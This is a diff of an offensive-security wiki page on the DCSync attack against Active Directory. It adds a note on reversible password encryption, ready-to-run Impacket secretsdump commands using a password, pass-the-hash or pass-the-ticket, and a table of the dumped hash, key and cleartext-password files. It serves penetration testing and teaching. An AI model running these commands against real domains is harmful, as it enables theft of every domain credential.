@@ -10,6 +10,10 @@ DCSync is a technique that uses Windows Domain Controller's API to simulate the 
 
 **This attack requires domain admin privileges** to succeed \(more specifically, it needs the following extended privileges: `DS-Replication-Get-Changes`  and `DS-Replication-Get-Changes-All`\). Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default. In some cases, over-privileged accounts can be abused to [grant controlled objects the right to DCSync](../../access-control-entries/grant-rights.md).
 
+{% hint style="info" %}
+A setting exists in the account policy or when creating users telling the domain controller to store the user's password using reversible encryption instead of irreversible hashing. This allows attackers to retrieve the passwords in clear-text.
+{% endhint %}
+
 ## Practice
 
 {% tabs %}
@@ -18,14 +22,24 @@ On UNIX-like systems, this attack can be carried out with [Impacket](https://git
 
 ```bash
 # using a plaintext password
-secretsdump -outputfile resultsfile 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
+secretsdump -outputfile 'something' 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
 
 # with Pass-the-Hash
-secretsdump -outputfile resultsfile -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
+secretsdump -outputfile 'something' -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
 
 # with Pass-the-Ticket
-secretsdump -k -outputfile resultsfile 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
+secretsdump -k -outputfile 'something' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
 ```
+
+The secretsdump script creates the following files.
+
+| File | Content |
+| :--- | :--- |
+| .ntds | LM and NT password hashes |
+| .cleartext | Passwords stored using reversible encryption |
+| .kerberos | Kerberos keys \(DES, AES128 and AES256\) |
+| .sam | Domain controller's [SAM secrets](sam-and-lsa-secrets.md) |
+| .secrets | Domain controller's [LSA secrets](sam-and-lsa-secrets.md) |
 
 This attack can also be operated with a [relayed NTLM authentication](../../lm-and-ntlm/relay.md), but only if the target domain controller is vulnerable to [Zerologon](../../netlogon/zerologon.md) since the DRSUAPI always requires signing.
 
